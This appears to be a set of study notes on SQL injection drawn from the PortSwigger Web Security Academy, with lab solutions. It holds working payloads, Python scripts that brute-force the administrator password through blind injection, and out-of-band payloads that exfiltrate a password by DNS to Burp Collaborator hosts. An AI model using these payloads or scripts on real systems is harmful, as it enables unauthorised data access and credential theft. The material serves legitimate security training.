## What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

## How to detect SQL injection vulnerabilities

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote character`'`and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as`OR 1=1`and`OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner.

## SQL injection in different parts of the query

Most SQL injection vulnerabilities occur within the`WHERE`clause of a`SELECT`query. Most experienced testers are familiar with this type of SQL injection.

However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In`UPDATE`statements, within the updated values or the`WHERE`clause.
- In`INSERT`statements, within the inserted values.
- In`SELECT`statements, within the table or column name.
- In`SELECT`statements, within the`ORDER BY`clause.

## Retrieving hidden data

Imagine a shopping application that displays products in different categories. When the user clicks on the**Gifts**category, their browser requests the URL:

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

This SQL query asks the database to return:

- all details (`*`)
- from the`products`table
- where the`category`is`Gifts`
- and`released`is`1`.

The restriction`released = 1`is being used to hide products that are not released. We could assume for unreleased products,`released = 0`.

## Retrieving hidden data - Continued

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

This results in the SQL query:

Crucially, note that`--`is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes`AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

This results in the SQL query:

The modified query returns all items where either the`category`is`Gifts`, or`1`is equal to`1`. As`1=1`is always true, the query returns all items.

#### Warning

Take care when injecting the condition`OR 1=1`into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an`UPDATE`or`DELETE`statement, for example, it can result in an accidental loss of data.

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

```
Solution:
https://url/filter?category=Gifts%27%20OR%201=1--%20-
```

## Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username`wiener`and the password`bluecheese`, the application checks the credentials by performing the following SQL query:

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence`--`to remove the password check from the`WHERE`clause of the query. For example, submitting the username`administrator'--`and a blank password results in the following query:

This query returns the user whose`username`is`administrator`and successfully logs the attacker in as that user.

## Lab: SQL injection vulnerability allowing login bypass

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the`administrator`user.

```
Solution:
Username: administrator'-- -
```

## SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the`UNION`keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The`UNION`keyword enables you to execute one or more additional`SELECT`queries and append the results to the original query. For example:

This SQL query returns a single result set with two columns, containing values from columns`a`and`b`in`table1`and columns`c`and`d`in`table2`.

## SQL injection UNION attacks - Continued

For a`UNION`query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns required

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injecting a series of`ORDER BY`clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the`WHERE`clause of the original query, you would submit:

This series of payloads modifies the original query to order the results by different columns in the result set. The column in an`ORDER BY`clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

## Determining the number of columns required - Continued

The second method involves submitting a series of`UNION SELECT`payloads specifying a different number of null values:

If the number of nulls does not match the number of columns, the database returns an error, such as:

We use`NULL`as the values returned from the injected`SELECT`query because the data types in each column must be compatible between the original and the injected queries.`NULL`is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the`ORDER BY`technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a`NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

```
Solution:
Identify the number of select statement first by using ORDER BY statement
(with x increase from 1)
https://url/filter?category=Pets' ORDER BY x-- -
https://url/filter?category=Pets' UNION SELECT NULL,NULL,NULL-- -
```

## Database-specific syntax

On Oracle, every`SELECT`query must use the`FROM`keyword and specify a valid table. There is a built-in table on Oracle called`dual`which can be used for this purpose. So the injected queries on Oracle would need to look like:

The payloads described use the double-dash comment sequence`--`to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character`#`can be used to identify a comment.

For more details of database-specific syntax, see the[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of`UNION SELECT`payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

## Lab: SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

```
Solution:

Use ORDER BY statement to find the number of column of the SELECT statement
' ORDER BY x-- - (x increare from 1)

Then use UNION SELECT statement and try to change the position of
string element to find the position that can be string

' UNION SELECT NULL,'2YdgNi',NULL-- -
```

## Using a SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the`WHERE`clause.
- The database contains a table called`users`with the columns`username`and`password`.

In this example, you can retrieve the contents of the`users`table by submitting the input:

```SQL
' UNION SELECT username, password FROM users--
```

In order to perform this attack, you need to know that there is a table called`users`with two columns called`username`and`password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

## Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called`users`, with columns called`username`and`password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the`administrator`user.

```
Solution
' UNION SELECT username,password from users-- -
```

## Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```SQL
' UNION SELECT username || '~' || password FROM users--
```

This uses the double-pipe sequence`||`which is a string concatenation operator on Oracle. The injected query concatenates together the values of the`username`and`password`fields, separated by the`~`character.

The results from the query contain all the usernames and passwords, for example:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Different databases use different syntax to perform string concatenation. For more details, see the[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called`users`, with columns called`username`and`password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the`administrator`user.

```
Find the number of column by
' ORDER BY x-- -

Find the position that can be string

' UNION select null,'a'-- -

Extract

' UNION select null,username || ':' || password from users-- -
```

## Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

## Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:

For example, you could use a`UNION`attack with the following input:

```sql
' UNION SELECT @@version--
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft CorporationStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

```
Solution

' ORDER BY 2-- -

' union select null,'a'-- -

' union select null,@@version-- -
```

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query`information_schema.tables`to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```

This returns output like the following:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

This output indicates that there are three tables, called`Products`,`Users`, and`Feedback`.

You can then query`information_schema.columns`to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

This returns output like the following:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

This output shows the columns in the specified table and the data type of each column.

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the`administrator`user.

```
Solution

' order by 2-- -

' union select TABLE_NAME,null from information_schema.tables-- -

' union select COLUMN_NAME,null from information_schema.columns where table_name='users_fjcpau' -- -

' union select username_auendh,password_yxjhbo from users_fjcpau-- -
```

## Blind SQL injection

In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.

## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as`UNION`attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

When a request containing a`TrackingId`cookie is processed, the application uses a SQL query to determine whether this is a known user:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized`TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

## Exploiting blind SQL injection by triggering conditional responses - Continued

To understand how this exploit works, suppose that two requests are sent containing the following`TrackingId`cookie values in turn:

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- The first of these values causes the query to return results, because the injected`AND '1'='1`condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

## Exploiting blind SQL injection by triggering conditional responses - Continued

For example, suppose there is a table called`Users`with the columns`Username`and`Password`, and a user called`Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than`m`.

Next, we send the following input:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than`t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is`s`:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

We can continue this process to systematically determine the full password for the`Administrator`user.

#### Note

The`SUBSTRING`function is called`SUBSTR`on some types of database. For more details, see the SQL injection cheat sheet.

## Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a`Welcome back`message in the page if the query returns any rows.

The database contains a different table called`users`, with columns called`username`and`password`. You need to exploit the blind SQL injection vulnerability to find out the password of the`administrator`user.

To solve the lab, log in as the`administrator`user.

```
Solution

Check:
Cookies: TrackingId=xyz' AND '1'='1

Check password length
Cookie: TrackingId=y2KC1T2TtKCUzTbd' AND (select 'a' from users where username='administrator' and length(password)=20)='a

Extract
```

```python
import requests
import string

charset = string.ascii_lowercase + string.digits

burp0_url = "https://0a9800e103ff2b8481781b8400b1002c.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "y2KC1T2TtKCUzTbd",
    "session": "CrCtUOzTMiNBMdUAsbbVQ2HetHhYuuUL",
}

res = requests.get(burp0_url, cookies=burp0_cookies)


# Sample payload: ' AND (select 'a' from users where username='administrator' and length(password)=20)='a
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return "Welcome back!" in res.text

def get_password_length():
    length = 0
    while True:
        payload = f"' AND (select 'a' from users where username='administrator' and length(password)={length})='a"
        if blind_sql(payload):
            return length
        length += 1

def get_password():
    password_length = get_password_length()
    print(f"Password length: {password_length}")
    password = ""
    for i in range(password_length):
        for char in charset:
            payload = f"' AND (select 'a' from users where username='administrator' and substr(password, {i+1}, 1)='{char}')='a"
            if blind_sql(payload):
                password += char
                print(password)
                break
    return password
print(get_password())
```

## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.

## Exploiting blind SQL injection by triggering conditional errors

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

## Exploiting blind SQL injection by triggering conditional errors - Continued

To see how this works, suppose that two requests are sent containing the following`TrackingId`cookie values in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the`CASE`keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the`CASE`expression evaluates to`'a'`, which does not cause any error.
- With the second input, it evaluates to`1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### Note

There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.

## Lab: Blind SQL injection with conditional errors

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called`users`, with columns called`username`and`password`. You need to exploit the blind SQL injection vulnerability to find out the password of the`administrator`user.

To solve the lab, log in as the`administrator`user.

```python
import requests
import string

charset = string.ascii_lowercase + string.digits

burp0_url = "https://0a33001b04f7a1a080c7088400d400c3.web-security-academy.net/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "Ms58hEvnEIFr8BFU",
    "session": "PMbkBEcoEZTDBal6TbCJPq8dM9BEUW6M",
}

res = requests.get(burp0_url, cookies=burp0_cookies)


# Sample payload: ' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return "Internal Server Error" in res.text


def password_length():
    for i in range(1, 100):
        print(f"Trying length: {i}")
        payload = f"' AND (SELECT CASE WHEN LENGTH(password)={i} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a"
        if blind_sql(payload):
            return i
        
def get_password():
    password = ""
    # length = password_length()
    length = 20
    print(f"Password length: {length}")
    for i in range(1, length + 1):
        for char in charset:
            payload = f"' AND (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a"
            if blind_sql(payload):
                password += char
                print(password)
                break
    return password
print(get_password())
```

## Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an`id`parameter:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a`WHERE`statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

## Extracting sensitive data via verbose SQL error messages - Continued

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the`CAST()`function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an`int`, may cause an error similar to the following:

```
ERROR: invalid input syntax for type integer: "Example data"
```

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

## Lab: Visible error-based SQL injection

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called`users`, with columns called`username`and`password`. To solve the lab, find a way to leak the password for the`administrator`user, then log in to their account.

```
Solution

' AND 1=CAST((SELECT username from users LIMIT 1) as INT)--
' AND 1=CAST((SELECT password from users LIMIT 1) as INT)--
```

## Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

## Exploiting blind SQL injection by triggering time delays - Continued

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay, because the condition`1=2`is false.
- The second input triggers a delay of 10 seconds, because the condition`1=1`is true.

Using this technique, we can retrieve data by testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

#### Note

There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

## Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called`users`, with columns called`username`and`password`. You need to exploit the blind SQL injection vulnerability to find out the password of the`administrator`user.

To solve the lab, log in as the`administrator`user.

```python
import requests
import string
from urllib.parse import quote_plus, quote

charset = string.ascii_lowercase + string.digits
# charset = "tdepmpqvc9hdrbscined"

burp0_url = "https://0a3100ee037d7e3880ae30be00e400d2.web-security-academy.net/filter?category=Lifestyle"
burp0_cookies = {
    "TrackingId": "02Pa25f5Z0JFybY8",
    "session": "saZ3q52ueTNFHedDU4MsNaOoVLj6urpU",
}

# Sample payload: '; SELECT 1 FROM pg_sleep(10)--
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return res.elapsed.total_seconds() > 10

def parse_payload(payload):
    payload_quoted_plus = quote_plus(f";{payload}")
    return f"'{payload_quoted_plus}--"

# print(parse_payload("select 1 from pg_sleep(5)"))

def get_password_length():
    for i in range(1, 100):
        payload = f"SELECT CASE WHEN LENGTH(password)={i} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator'--"
        print(f"Trying: {i}")
        if blind_sql(parse_payload(payload)):
            return i


def get_password():
    # password_length = get_password_length()
    password_length = 20
    print(f"Password length: {password_length}")
    password = ""
    for i in range(password_length):
        for char in charset:
            payload = f"SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i+1}, 1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
            if blind_sql(parse_payload(payload)):
                password += char
                print(f"Found: {password}")
                break

    return password
print(get_password())
```

## Exploiting blind SQL injection using out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

## Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This causes the database to perform a lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

```python
# Solution

# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-out-of-band

def parse_payload(burp_collaborator_url):
    x = f"""UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{burp_collaborator_url}/"> %remote;]>'),'/l') FROM dual"""
    payload = f"'{quote_plus(x)}--"
    return payload
print(parse_payload("o1qccbamtvzvyoh0ol4ql72zcqih67uw.oastify.com"))
```

## Lab: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the`Administrator`user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

#### Note

There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

## Lab: Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called`users`, with columns called`username`and`password`. You need to exploit the blind SQL injection vulnerability to find out the password of the`administrator`user.

To solve the lab, log in as the`administrator`user.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

```python
# Solution

import requests
from urllib.parse import quote_plus, quote

burp0_url = "https://0a20004004f896b380130352005100b6.web-security-academy.net/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "AlkrYDDTZC31Wwdc",
    "session": "3r38N0CTjalkQOJwXs8wPJf6Q4bxhVhX",
}

def oast_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    print(res.status_code)


def parse_payload(query, burp_collaborator_url):
    x = f"""UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||({query})||'.{burp_collaborator_url}/"> %remote;]>'),'/l') FROM dual"""
    payload = f"'{quote_plus(x)}--"
    return payload

payload = parse_payload("SELECT password from users where username='administrator'", "o1qccbamtvzvyoh0ol4ql72zcqih67uw.oastify.com")
oast_sql(payload=payload)
```

## SQL injection in different contexts

In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.

